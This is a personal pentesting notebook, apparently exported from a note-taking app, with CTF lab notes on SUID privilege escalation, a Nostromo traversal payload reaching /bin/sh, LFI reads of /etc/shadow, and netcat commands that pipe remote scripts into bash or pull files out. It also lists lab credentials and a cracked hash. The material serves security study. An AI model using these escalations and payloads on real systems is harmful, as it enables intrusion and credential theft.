			<node custom_icon_id="0" foreground="" is_bold="False" name="Algorithms" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587669129.84" ts_lastsave="1587669166.83" unique_id="446">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="jsteg" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587669137.82" ts_lastsave="1587669516.68" unique_id="447">
					<rich_text>abuses jpegs image corruption to better hide data
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
to put it simply a jpeg image has coefficients, and jsteg looks at them and alters them in ever so slightly ways not to disturb the balance coefficients to make it less obvious that there is data hidden within
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
histogram analysis
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
with the power of machine learning even that slight difference can be identified with enough images, TODAY. 04.2020
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ohaaa, dvdlere stenoyla watermark gomerlerse, hangi dvdnin yayindan once leaklendigini tespit edebilirler, leakleyeni bulabilirler</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="steghide" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587134317.43" ts_lastsave="1589770434.98" unique_id="365">
				<rich_text>hide stuff in images using Steganography

Arguments:

Usage:
1) To embed emb.txt in cvr.jpg: 
steghide embed -cf cvr.jpg -ef emb.txt
2) To extract embedded data from stg.jpg: 
steghide extract -sf stg.jpg

</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="suid exploits" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587292918.27" ts_lastsave="1589758941.46" unique_id="384">
			<rich_text>Set owner UserID
When a user runs a program, given they have the correct reading/executing rights, it will run using their account privileges. SUID allows a user to run a program using another users privileges.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The SUID bit is set on the execute permission, meaning when a user runs this, it will run as the file owner (which is root).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
find / -perm -u=s -type f 2&gt;/dev/null #this no ls command is useless
find / -perm -4000 -type f 2&gt;/dev/null -exec ls -ldb {} \;
find / -user root -perm -4000 -type f 2&gt;/dev/null -exec ls -ldb {} \;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
found a suid binary you can execute commands with? Great! Use that binary and just give bash +s
&quot;chmod +s /bin/bash&quot; 
then you can run
/bin/bash -p
and ur good(root)!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="/bin/systemctl" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589698733.74" ts_lastsave="1589701090.59" unique_id="500">
				<rich_text>var=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot; 
[Install]
WantedBy=multi-user.target' &gt; $var
/bin/systemctl link $var
/bin/systemctl enable --now $var

DISCLAIMER: Press &quot;Enter&quot; several times after its done!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
when the fake service starts call the default system shell (the -c tells the shell to execute everything inside the quotes), use cat to display the contents of the root.txt file and output that to a file called output in the /tmp directory. 
ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/xd.txt&quot;
(I changed it to root bash :)</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="rdp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589758954.09" ts_lastsave="1589759051.78" unique_id="514">
			<rich_text>remote desktop protocol
softwares in subnode</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="xfreerdp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589758964.39" ts_lastsave="1589758979.52" unique_id="515">
				<rich_text>xfreerdp /u:&quot;wade&quot; /p:parzival /v:10.10.201.5</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="rdesktop" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589758988.77" ts_lastsave="1589759000.74" unique_id="516">
				<rich_text>rdesktop -u thmyris -p password $IP</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="1 way to get around manual directory traversal blockage in webservers" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586680366.86" ts_lastsave="1591388804.9" unique_id="313">
			<rich_text>your POST requests 1st line is this:
/../../../bin/sh HTTP 1.1

You can turn the / (leave 1st / as is) -&gt; %2f
Maybe that helps.
But the funny thing is...

If you put 'carriage return' in between dots
you may just get around the firewall :)
like this:
/.%0d./.%0d./.%0d./.%0d./bin/sh HTTP 1.1

this works in nostromo webservers (patched in 1.9.7 see changelog)
This exploit only worked because the strcutl.c removed any carriage return it saw. So putting carriage return in there bypassed the firewall. Wow!
The project is open source so this was no guesswork but pure determined examination.
Well done with the CVE
CVE-2019-16278

We can grep the source code to find out where the firewall for the directory traversal is:
grep -RF /../ .

it directs us to http.c
in there we search /../ and find the 'if statement' that is the firewall:
if (strstr(header, &quot;/../&quot;) != NULL) {
thanks for explanation ippsec!
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="a trash idea" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587234019.02" ts_lastsave="1587234129.62" unique_id="375">
			<rich_text># Replace &quot;rm&quot; command so that files are disposed to the
# user's Gnome trash can.
#
rmfile()
{
   type=`/usr/bin/stat --printf=&quot;%F&quot; &quot;$1&quot;`

   if [ &quot;$type&quot; == &quot;directory&quot; ]; then
        echo -n &quot;rm: cannot remove \`&quot;
        echo -n $1
        echo &quot;\`: Is a directory&quot;
   else
        dir=`/usr/bin/dirname &quot;$1&quot;`
        file=`/usr/bin/basename &quot;$1&quot;`
        info=${HOME}/.local/share/Trash/info/&quot;$file&quot;.trashinfo

        cd &quot;$dir&quot;

        /bin/cp &quot;$file&quot; ${HOME}/.local/share/Trash/files
        /bin/rm -f &quot;$file&quot;

        echo &quot;[Trash Info]&quot;                &gt; &quot;$info&quot;
        echo &quot;Path=$PWD/$file&quot;            &gt;&gt; &quot;$info&quot;
        echo &quot;DeletionDate=`date +%FT%T`&quot; &gt;&gt; &quot;$info&quot;

        cd &quot;$OLDPWD&quot;
   fi
}</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="b64 decode and play with session cookies" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587051805.18" ts_lastsave="1587051807.32" unique_id="354">
			<rich_text>
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="bash file versioning check" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586681148.38" ts_lastsave="1587477872.49" unique_id="314">
			<rich_text>sort of like git
You need to have subfolders of different versions of file to use this. Like:
v1.1
v1.2
v1.3
all in 1 folder
and you execute these from that 1 folder.

This gives the hashes of all the unique files:
find . -type f -exec md5sum {} \; | awk '{print $1}' | sort | uniq -c | grep ' 1 '

The 2nd command gives a list of every file changed.
find . -type f -exec md5sum {} \; | awk '{print $1}' | sort | uniq -c | grep ' 1 ' | awk '{print $2}' &gt; hashes
find . -type f -exec md5sum {} \; | grep -f hashes

</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Bug Bounty Tips" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587474946.46" ts_lastsave="1587474961.42" unique_id="15">
			<rich_text>change put to post, check for csrf: </rich_text>
			<rich_text link="webs https://twitter.com/bugraeskici/status/1134197334856929283">https://twitter.com/bugraeskici/status/1134197334856929283</rich_text>
			<rich_text>
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="cookies" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587636831.33" ts_lastsave="1587636843.21" unique_id="442">
			<rich_text>dont forget em
manipulate em
get em bois
aaaaaaaaaaaaaa
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="docker" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587481671.76" ts_lastsave="1587481733.47" unique_id="424">
			<rich_text>Find out if you are in one:
ps aux         # will print so little processes so you know ur in container
.dockerenv     # folder on root

</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="exiftool" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1584704048.4" ts_lastsave="1589770294.64" unique_id="157">
			<rich_text>gives metadata

Arguments:
-b          #extract binary</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="foxyproxy" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586687294.63" ts_lastsave="1586687296.87" unique_id="316">
			<rich_text>set a proxy to
127.0.0.1 8080
for burpsuite

go to chrome://flags
Enable -&gt; Allow invalid certificates for resources loaded from localhost.
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="ftp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587492896.13" ts_lastsave="1589764363.57" unique_id="430">
			<rich_text>ftp can translate file types to connect dissimilar systems

browser:
</rich_text>
			<rich_text link="webs ftp://username:password@ftp.xyz.com">ftp://username:password@ftp.xyz.com</rich_text>
			<rich_text>
anon login:
ftp 10.10.68.50        #anonymous:guest, anonymous@$ip.com #anonymous@example.com:anonymous


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Usage:
ls
lcd                 #change local dir
get file            #downlads a file, cant download dirs
user username       #su 
pwd
lcd                 #change local directory to download to
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="i wanna write a file but i dont have permissions on home !?!?!?" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586721685.89" ts_lastsave="1586721688.5" unique_id="330">
			<rich_text>use /dev/shm
:)</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="mounted win partitions" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587411930.18" ts_lastsave="1587412941.28" unique_id="398">
			<rich_text>mounted windows partitions mount everything with every *nix permission enabled. The owners of the file will be the user still</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="oscp survival guide" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587497499.94" ts_lastsave="1587497516.21" unique_id="432">
			<rich_text link="webs https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#enumeration">https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#enumeration</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="pinging the router might give a sense of if the connection is wired or wireless" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587207667.58" ts_lastsave="1587207675.67" unique_id="370">
			<rich_text>default gateway is the router
1-3ms is what i get from incredibly close laptops</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="pipe your scripts into a remote shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586675322.46" ts_lastsave="1587637443.9" unique_id="306">
			<rich_text>If remote shell has /usr/bin/nc you can use that nc and your own nc to pipe a script into it. This is useful for when you have no write priv on the box. Same thing with curling a web server.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Local:
nc -lvnp 9001 &lt; linpeas.sh

Remote:
nc 10.10.14.2 9001 | bash</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="scp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586721391.27" ts_lastsave="1589775193.03" unique_id="329">
			<rich_text>secure copy
scp allows you to copy files to and from remote locations
it will ask the user password

scp linpeas.sh jan@10.10.11.243:/dev/shm
scp -i id_rsa linpeas.sh jessie@10.10.101.43:/dev/shm

</rich_text>
			<rich_text scale="h2">SCP examples</rich_text>
			<rich_text>
Copy file from a remote host to local host SCP example:
$ scp username@from_host:file.txt /local/directory/ 
Copy file from local host to a remote host SCP example:
$ scp file.txt username@to_host:/remote/directory/ 
Copy directory from a remote host to local host SCP example:
$ scp -r username@from_host:/remote/directory/  /local/directory/ 
Copy directory from local host to a remote hos SCP example:
$ scp -r /local/directory/ username@to_host:/remote/directory/ 
Copy file from remote host to remote host SCP example:
$ scp username@from_host:/remote/directory/file.txt username@to_host:/remote/directory/

</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="searchsploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586679727.98" ts_lastsave="1589828076.23" unique_id="312">
			<rich_text>searchsploit &lt;keyword for title&gt;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cat /usr/share/exploitdb/
exploits/php/webapps/40718.txt

Args:
--nmap [file.xml]           #Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml)</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="sh might point to dash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586634138.65" ts_lastsave="1586634751.65" unique_id="297">
			<rich_text>/usr/bin/sh may be a dash shell

use /bin/bash to make sure you're running bash.

dash doesn't have /dev/tcp</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="sudo terminates @ the |" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586679282.52" ts_lastsave="1590117378.92" unique_id="310">
			<rich_text>sudo terminates at the pipe
anything after | will be run as user
but you can sudo again after pipe

</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="virtual host routing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586677450.12" ts_lastsave="1586677657.88" unique_id="274">
			<rich_text>if the box has a webserver and its hosts file contains a line like this:
127.0.1.1   sniper.htb sniper

you should test to see if the box has virtual host routing
intercept the package with burp and change the 'Host':
to 'sniper.htb' and then 'sniper'
and see if the amount of bytes return changes.
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="WaybackMachine" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587065085.56" ts_lastsave="1587065085.56" unique_id="364">
			<rich_text>
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="whoami and cd ~" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587302297.0" ts_lastsave="1589758770.58" unique_id="371">
			<rich_text>when ur exploiting a suid privesc
even if whoami gives user X
you may not be able to cd ~ to X's home.</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="wireshark" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587134537.26" ts_lastsave="1587637750.7" unique_id="366">
			<rich_text>1)
right click a packet and follow streams (doesnt follow every stream, you might need to check other packets' streams also)

2)
you can export objects out of packets by: File -&gt; Export Objects

3)
be on the lookout for hexed text. URLs for example can be hex encoded in those DNS packets (thanks adventofcyber/day6)</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="wordlists" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586540758.53" ts_lastsave="1586541754.46" unique_id="290">
			<rich_text>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="yoink file with nc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586719791.54" ts_lastsave="1591199917.41" unique_id="323">
			<rich_text>Remote:
nc -q 0 10.10.218.184 9001 &lt; linpeas.sh
# added -q 0 recently, DIDNT TEST YET

Local:
nc -lvnp 9001 &gt; file
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="good ol sticky keys trick" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587676252.22" ts_lastsave="1587676253.16" unique_id="450">
			<rich_text>you can change the file remotely by bypassing uac, and remote desktop and get a cmd without logging in asdhgajhsfgdja</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="LFI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587727792.94" ts_lastsave="1587728422.43" unique_id="455">
			<rich_text>Local File Inclusion
Some web applications include the contents of other files, and prints it to a web page.
</rich_text>
			<rich_text link="webs https://example.com/?include_file=file1.php">https://example.com/?include_file=file1.php</rich_text>
			<rich_text>
This would take the contents from file1.php and display it on the page.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Permissions:
When the web application includes a file, it will read it with the permissions of the user running the web server.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerabilities:
• /etc/shadow - View hashes passwords of all users on the system
• server.js or index.js - If the application was written in NodeJS, these are common file names that contain the main code to an application - potential API credentials might be exposed upon reading the file.
• /etc/hosts - Perhaps the web server machine is communicating with other devices on the network.
• /uploads/evil.php - If you manage to upload your own web shell onto the web server at some point, you can have it executed by including the file.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Multiple slashes:
</rich_text>
			<rich_text family="monospace">https://example.com/notes/?include=/etc/shadow</rich_text>
			<rich_text>
The server will think its going to /notes/include/etc/shadow. 
</rich_text>
			<rich_text family="monospace">https://example.com/notes/?include=%2Fetc%2Fshadow</rich_text>
			<rich_text>
This new request will be made to /notes/ and then convert the %2F to a slash!
NOTE: But you want not to encode every / only some. I think.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="AWS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588349682.33" ts_lastsave="1588353063.74" unique_id="468">
			<rich_text>amazon web services
Simple Storage Service (S3)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Permissions:</rich_text>
			<rich_text weight="heavy">
• List objects: user with permissions can list the files in the bucket

• Write objects: user with permissions can add/remove files on the bucket

• Read bucket permissions: users with permissions can read files on the bucket

• Write bucket permissions: users with permissions can edit files on the bucket
The permissions above apply to the bucket, but an administrator can also assign specific permissions to files/objects in the bucket. 
In the past, the default S3 permissions were weak and S3 buckets would be publicly accessible but AWS changed this to block public access by default. 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
How would you find an s3 bucket name:
• Source code on git repositories 
• Analysing requests on web pages
    Some pages retrieve static resources from s3 buckets
• Domain name of product names:
    If a product or domain is called “servicename” then the s3 bucket may also be called “servicename”
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bucketname.s3.amazonaws.com
bucketname.region-name.amazonaws.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If you’ve found objects on an s3 bucket, you would want to download them to view their contents. You do this using the </rich_text>
			<rich_text foreground="#1155cc" link="webs https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html" underline="single" weight="heavy">AWS CLI</rich_text>
			<rich_text underline="single" weight="heavy">. To use the AWS CLI, you need to create an account.</rich_text>
			<rich_text weight="heavy">
Once you have created an AWS account, 
   → you can check the contents of the bucket using the command:
        </rich_text>
			<rich_text style="italic" weight="heavy">aws s3 ls s3://bucket-name</rich_text>
			<rich_text weight="heavy">

   → To download the files, you can use the command:
        </rich_text>
			<rich_text style="italic" weight="heavy">aws s3 cp s3://bucket-name/file-name local-location</rich_text>
			<rich_text weight="heavy">
    
   → Alternatively, you can also use the following method to access a file:
        </rich_text>
			<rich_text style="italic" weight="heavy">bucketname.region-name.amazonaws.com/file-name</rich_text>
			<rich_text weight="heavy">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


</rich_text>
			<rich_text>
</rich_text>
			<rich_text weight="heavy">NOTES:</rich_text>
			<rich_text>
</rich_text>
			<rich_text style="italic">Is this realistic: </rich_text>
			<rich_text style="italic" weight="heavy">very</rich_text>
			<rich_text style="italic">. There have been a lot of breaches due to s3 bucket misconfigurations:</rich_text>
			<rich_text>
• </rich_text>
			<rich_text foreground="#1155cc" link="webs https://arstechnica.com/information-technology/2017/05/defense-contractor-stored-intelligence-data-in-amazon-cloud-unprotected/" style="italic" underline="single">https://arstechnica.com/information-technology/2017/05/defense-contractor-stored-intelligence-data-in-amazon-cloud-unprotected/</rich_text>
			<rich_text style="italic" underline="single">
• </rich_text>
			<rich_text foreground="#1155cc" link="webs https://www.infosecurity-magazine.com/news/accenture-leaked-data-another-aws/" style="italic" underline="single">https://www.infosecurity-magazine.com/news/accenture-leaked-data-another-aws/</rich_text>
			<rich_text style="italic" underline="single">
• </rich_text>
			<rich_text foreground="#1155cc" link="webs https://www.infosecurity-magazine.com/news/data-leak-exposes-750k-birth-cert/" style="italic" underline="single">https://www.infosecurity-magazine.com/news/data-leak-exposes-750k-birth-cert/</rich_text>
			<rich_text style="italic" underline="single">

</rich_text>
			<rich_text weight="heavy">
</rich_text>
			<rich_text>





</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="URL encoding" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587729494.61" ts_lastsave="1587729495.18" unique_id="457">
			<rich_text>required to seperate lfi slashes from 'directory to call from' slashes</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Things that need to be up to date" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589761011.27" ts_lastsave="1589761023.48" unique_id="522">
			<rich_text>nmap scripting engine (vuln)
searchsploit
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="smb" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589762595.36" ts_lastsave="1589765988.58" unique_id="525">
			<rich_text>smbclient -L 10.10.24.91
smbmap -H 10.10.24.91 -R                #R is for recursive; H for hostname


smbclient \\\\10.10.68.50\\pics         #just logs you in to a share without $ at the end, magically if you give no password

Arguments (smbclient):
l               #list files in share
tdis            #DONT USE, deletes smth</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="if you have a suid file download method like suid on wget" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589775372.68" ts_lastsave="1589775794.72" unique_id="527">
			<rich_text>get /etc/passwd
create a hash for yourself with python/crypt lib
put a hashed password on the x in -&gt; root:x:.. 
download this file overwriting /etc/passwd with suid
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="bind shells" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589868430.38" ts_lastsave="1589868437.23" unique_id="536">
			<rich_text>opposite of reverse shells.
ssh is an example</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="resme reverse shell gomebilirsin" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590081296.35" ts_lastsave="1590081297.72" unique_id="575">
			<rich_text>php shell olur,
bash reverse olr
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="OWASP ZAP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591008360.43" ts_lastsave="1591008384.48" unique_id="262">
			<rich_text>burp alternative

more brute forcing? ffuf
automated scanner? owasp.org -&gt; www-community -&gt; Vuln scanning tools</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="gdb" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591033274.41" ts_lastsave="1591394353.95" unique_id="591">
			<rich_text>

Usage:
gdb FILE

Usage(gdb console):
set disassembly-flavor intel    # Fix the horrible looking atnt syntax
disassemble main                # Every program has a main function.
info registers
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="info registers" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591033285.11" ts_lastsave="1591033285.11" unique_id="592">
				<rich_text></rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="kart hacking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592513132.49" ts_lastsave="1592513132.49" unique_id="596">
			<rich_text></rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="NFC Tools" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592513107.62" ts_lastsave="1592513134.68" unique_id="595">
				<rich_text>nfc kartlari incelemek icin mobil uygulama
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="proxmark4" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592512828.48" ts_lastsave="1592513564.6" unique_id="594">
				<rich_text>kart analizi yapmak icin kullaniliyor
lf(low freq) genelde bankalarda yaka karti olarak falan kullaniliyor
hf kentkart istanbulkart gibi seylerde kullaniliyor
istanbulkartin uidleri degistirilemiyor.
lunaparklarda bu iki freq de degil baska bisey kullaniliyor.</rich_text>
			</node>
		</node>
	</node>
	<node custom_icon_id="30" foreground="#525252" is_bold="True" name="Box Notes" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586540191.03" ts_lastsave="1589919155.57" unique_id="287">
		<rich_text>notes for the active box im working on these are probably only useful for a walkthrough as new things I learn belong to other categories such as pentesting

dont forget to put these notes back in the respective folder for clarity, maybe even delete from here idk

REMINDER: These notes are a draft. They are meant to stay a draft. I first take notes, then after im done with a box I go over them to add new learnings to the document</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="THM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586540200.1" ts_lastsave="1589752646.3" unique_id="289">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="adventofcyber" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587050136.95" ts_lastsave="1589428177.5" unique_id="352">
				<rich_text>
after ur done with this, pls integrate

RL objects in the story:
Elf McSkidy(you)
Christmas Monster (Santa’s Fav Nemesis)
Elf McElferson, the CTO of the arctic circle
Santa’s company(The Best Festival Company)


Topics:
• Linux Security
• Web Application Security
• Network Security
• Reverse Engineering
• Forensics


</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="day1" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587050552.78" ts_lastsave="1587637699.02" unique_id="353">
					<rich_text>
1)can be used for file exec, its on the main page.
</rich_text>
					<rich_text link="webs http://10.10.87.12:3000/assets/elf.gif">http://10.10.87.12:3000/assets/elf.gif</rich_text>
					<rich_text>
</rich_text>
					<rich_text link="webs http://10.10.87.12:3000/assets/santa.gif">http://10.10.87.12:3000/assets/santa.gif</rich_text>
					<rich_text>
</rich_text>
					<rich_text link="webs http://10.10.87.12:3000/assets/circle.png">http://10.10.87.12:3000/assets/circle.png</rich_text>
					<rich_text>

registering
</rich_text>
					<rich_text weight="heavy">voshkhok@sharklasers.com</rich_text>
					<rich_text>
testname
testuser
123456

Got a user created message.
no email
logged in
@ </rich_text>
					<rich_text link="webs http://10.10.87.12:3000/home">http://10.10.87.12:3000/home</rich_text>
					<rich_text> now
changed the cookie to 
bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw==
to access mcinventorys account
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="day2" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587052227.22" ts_lastsave="1587637701.08" unique_id="355">
					<rich_text>@ /login
</rich_text>
					<rich_text link="webs http://10.10.177.7:3000/assets/pen.gif">http://10.10.177.7:3000/assets/pen.gif</rich_text>
					<rich_text>
</rich_text>
					<rich_text link="webs http://10.10.177.7:3000/assets/pole.png">http://10.10.177.7:3000/assets/pole.png</rich_text>
					<rich_text>

/sysadmin has different login
from github
admin:defaultpass</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="day3" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587053273.43" ts_lastsave="1587637702.95" unique_id="356">
					<rich_text>Randomly following tcp streams led me to this:
echo 'ps4' &gt; christmas_list.txt
cat /etc/shadow
root:*:18171:0:99999:7:::
daemon:*:18171:0:99999:7:::
bin:*:18171:0:99999:7:::
sys:*:18171:0:99999:7:::
sync:*:18171:0:99999:7:::
games:*:18171:0:99999:7:::
man:*:18171:0:99999:7:::
lp:*:18171:0:99999:7:::
mail:*:18171:0:99999:7:::
news:*:18171:0:99999:7:::
uucp:*:18171:0:99999:7:::
proxy:*:18171:0:99999:7:::
www-data:*:18171:0:99999:7:::
backup:*:18171:0:99999:7:::
list:*:18171:0:99999:7:::
irc:*:18171:0:99999:7:::
gnats:*:18171:0:99999:7:::
nobody:*:18171:0:99999:7:::
systemd-network:*:18171:0:99999:7:::
systemd-resolve:*:18171:0:99999:7:::
syslog:*:18171:0:99999:7:::
messagebus:*:18171:0:99999:7:::
_apt:*:18171:0:99999:7:::
lxd:*:18171:0:99999:7:::
uuidd:*:18171:0:99999:7:::
dnsmasq:*:18171:0:99999:7:::
landscape:*:18171:0:99999:7:::
sshd:*:18171:0:99999:7:::
pollinate:*:18171:0:99999:7:::
ubuntu:!:18232:0:99999:7:::
buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::


found out if it starts with $6$ its sha-512, cracking with hashcat with rockyou.
cracked on sis's pc, chromebook doesnt support some kernel or smth
buddy:rainbow


</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="8" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587233058.21" ts_lastsave="1587681689.2" unique_id="372">
					<rich_text>10.10.88.162
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
holly:tuD@4vt0G*TU
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Looking for possible passwords inside /home/holly/.bash_history
find / -user root -perm -4000 -print 2&gt;/dev/null
sudo su igor                                                                                                                    
su igor
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ubuntu can sudo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Unmounted file-system?
[i] Check if you can mount umounted devices
LABEL=cloudimg-rootfs   /        ext4   defaults,discard        0 0
